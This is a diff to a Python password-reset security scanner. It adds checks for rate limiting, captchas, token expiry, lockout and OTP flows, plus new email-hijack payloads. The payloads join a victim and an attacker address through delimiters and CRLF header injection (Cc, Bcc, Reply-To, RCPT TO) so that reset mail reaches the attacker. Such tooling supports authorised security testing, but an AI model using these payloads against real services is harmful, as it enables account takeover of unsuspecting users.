@@ -1,6 +1,7 @@
 #!/usr/bin/env python3
 
 import argparse  # noqa: F401
+import base64
 import random
 import re  # noqa: F401
 import os
@@ -71,6 +72,159 @@ def human_time(human: str) -> None:
     elif human.lower() in ("r", "random"):
         time.sleep(random.randrange(6))  # nosec B311
 
+
+## Rate-limit awareness (avoids baseline drift false-positives) ##
+
+RATE_LIMIT_KEYWORDS = [
+    "too many", "rate limit", "ratelimit", "try again", "throttle",
+    "too many requests", "slow down", "retry after", "quota exceeded",
+    "please wait", "blocked",
+]
+
+
+## Anti-automation awareness (captcha / single-use tokens) ##
+
+# Field names that are consumed after one use, making replay-based confirmation
+# unreliable: the token is dead on request #2, but the server may still answer 200.
+ANTI_AUTOMATION_MARKERS = [
+    "g-recaptcha-response", "h-captcha-response", "cf-turnstile-response",
+    "recaptcha", "hcaptcha", "turnstile", "captcha",
+]
+
+
+def detect_anti_automation(parsed_req) -> list[str]:
+    """Return the anti-automation markers found in the request (body + headers)."""
+    hay = (parsed_req.get("body") or "").lower()
+    hay += " " + " ".join(f"{k}:{v}" for k, v in parsed_req.get("headers", {}).items()).lower()
+    return [m for m in ANTI_AUTOMATION_MARKERS if m in hay]
+
+
+## Auth / baseline-validity awareness ##
+
+# If the baseline itself is an auth error, EVERY subsequent finding is meaningless
+# (the endpoint is rejecting us, not processing the reset). Warn loudly.
+AUTH_ERROR_MARKERS = [
+    "unauthenticated", "unauthorized", "invalid credentials", "access denied",
+    "not authenticated", "invalid token", "token expired", "expired token",
+    "authentication required", "missing authentication", "forbidden",
+]
+
+
+def baseline_looks_error(baseline):
+    """Return a short reason if the baseline response looks like an error/auth
+    rejection (so findings would be invalid), else None."""
+    if not baseline:
+        return None
+    st = baseline.get("status")
+    body = (baseline.get("body") or "").lower()
+    if st in (401, 403):
+        return f"HTTP {st}"
+    if isinstance(st, int) and st >= 500:
+        return f"HTTP {st}"
+    for m in AUTH_ERROR_MARKERS:
+        if m in body:
+            return m
+    try:
+        d = json.loads(baseline.get("body") or "")
+        if isinstance(d, dict) and d.get("errors") and not d.get("data"):
+            return "GraphQL errors (no data)"
+    except Exception:
+        pass
+    return None
+
+
+def detect_bearer_expiry(parsed_req):
+    """
+    If the request carries an Authorization: Bearer <JWT> whose `exp` is already
+    past or expiring soon, return (label, seconds_left) where label is
+    'expired' | 'expiring' | 'ok'. Else None.
+
+    API reset endpoints (e.g. Salesforce Commerce SLAS) require a short-lived
+    guest token; a scan that fires hundreds of requests will see it die mid-run,
+    turning every later 'candidate' into noise — so flag it up front.
+    """
+    headers = parsed_req.get("headers", {}) if parsed_req else {}
+    tok = None
+    for k, v in headers.items():
+        if k.lower() == "authorization" and isinstance(v, str) and v.lower().startswith("bearer "):
+            tok = v.split(None, 1)[1].strip()
+            break
+    if not tok or tok.count(".") < 2:
+        return None
+    try:
+        p = tok.split(".")[1]
+        p += "=" * (-len(p) % 4)
+        payload = json.loads(base64.urlsafe_b64decode(p))
+    except Exception:
+        return None
+    exp = payload.get("exp")
+    if not exp:
+        return None
+    left = int(exp) - int(time.time())
+    if left <= 0:
+        return ("expired", left)
+    if left < 300:
+        return ("expiring", left)
+    return ("ok", left)
+
+
+## Lockout / attempt-cap awareness (OTP brute-force resistance) ##
+
+# Signals that the account/flow got locked after too many wrong attempts. Seeing
+# one is GOOD (an attempt cap exists) — the OTP tester must stop immediately so it
+# doesn't keep hammering (and to avoid locking the user's own account further).
+LOCKOUT_KEYWORDS = [
+    "account_suspended", "account is temporarily blocked", "temporarily blocked",
+    "account locked", "account is locked", "too many attempts", "too many tries",
+    "max attempts", "maximum attempts", "locked out", "compte bloqu",
+    "compte verrouill", "trop de tentatives", "user_locked", "auth_blocked",
+]
+
+
+def detect_lockout(text) -> bool:
+    """True if a response indicates the account/flow was locked after retries."""
+    if not text:
+        return False
+    low = text.lower()
+    return any(kw in low for kw in LOCKOUT_KEYWORDS)
+
+
+## Reset-flow classification (link-based vs code/OTP-based) ##
+
+# Markers that prove the reset is a CODE/OTP flow (user types a code back), where
+# there is no emailed link to poison — so Host/X-Forwarded-Host link-poisoning is
+# structurally N/A and the effort belongs on OTP strength + email-header injection.
+RESET_FLOW_CODE_MARKERS = [
+    "confirmation_code", "confirmationcode", "recover_password_confirmation_code",
+    "verification_code", "verificationcode", "one_time_password", "onetimepassword",
+    "\"otp\"", "otp_", "_otp", "enter the code", "enter your code", "code envoy",
+    "saisissez le code", "passwordless", "nextaction",
+]
+
+
+def classify_reset_flow(baseline):
+    """
+    Best-effort: return 'code' when the trigger response clearly reveals a
+    code/OTP flow, else None (unknown — most APIs don't reveal it in the response;
+    the email is then the ground truth). Deliberately does NOT positively guess
+    'link', since a link only appears in the delivered email, not the response.
+    """
+    if not baseline:
+        return None
+    body = (baseline.get("body") or "").lower()
+    if any(m in body for m in RESET_FLOW_CODE_MARKERS):
+        return "code"
+    return None
+
+
+def baseline_is_rate_limited(baseline) -> bool:
+    """True if a baseline response dict looks rate-limited / throttled."""
+    if not baseline:
+        return False
+    if baseline.get("status") == 429:
+        return True
+    body = (baseline.get("body") or "").lower()
+    return any(kw in body for kw in RATE_LIMIT_KEYWORDS)
 
 
 ## Password-reset shared payloads / helpers ##
@@ -175,9 +329,26 @@ def build_email_hijack_payloads(victim_email, attacker_email):
         # Homoglyph in local part
         v.replace("a", "а", 1),
 
-        # Space as multi-recipient separator
+        # Multi-recipient via delimiters (mailer/library may split on these)
         f"{v} {ae}",
         f"{ae} {v}",
+        f"{v},{ae}",
+        f"{ae},{v}",
+        f"{v};{ae}",
+        f"{v}|{ae}",
+        f"{v}%2C{ae}",          # percent-encoded comma
+        f"{v}%20{ae}",          # percent-encoded space
+        f'"{v}",{ae}',
+        f"{v}\n{ae}",
+
+        # Email-header (MIME) injection → carbon-copy the reset mail to the attacker
+        f"{v}%0d%0aCc:{ae}",
+        f"{v}%0d%0aBcc:{ae}",
+        f"{v}%0aCc:{ae}",
+        f"{v}%0aBcc:{ae}",
+        f"{v}\r\nCc:{ae}",
+        f"{v}\r\nBcc:{ae}",
+        f"{v}%0d%0aReply-To:{ae}",
 
         # SMTP command injection
         f"{v}%0d%0aRCPT TO:<{ae}>",
@@ -236,7 +407,9 @@ def check_raw_response(raw_resp, interactdom, baseline, payload, interact, canar
     status_match = re.search(r"HTTP/[\d.]+ (\d{3})", raw_resp)
     if status_match:
         status_code = int(status_match.group(1))
-        if status_code != baseline['status'] and status_code not in [400, 403]:
+        # 421 (Misdirected Request) & other rejections aren't HHI signals — a wrong
+        # Host over HTTP/2 legitimately 421s, so a whole run of them is just noise.
+        if status_code != baseline['status'] and status_code not in (400, 401, 403, 404, 405, 421, 429, 500, 502, 503, 504):
             print(f"{Colors.YELLOW}   └── [{baseline['status']} > {status_code}] {Colors.RESET}| PAYLOAD: {payload}")
 
     if interact:
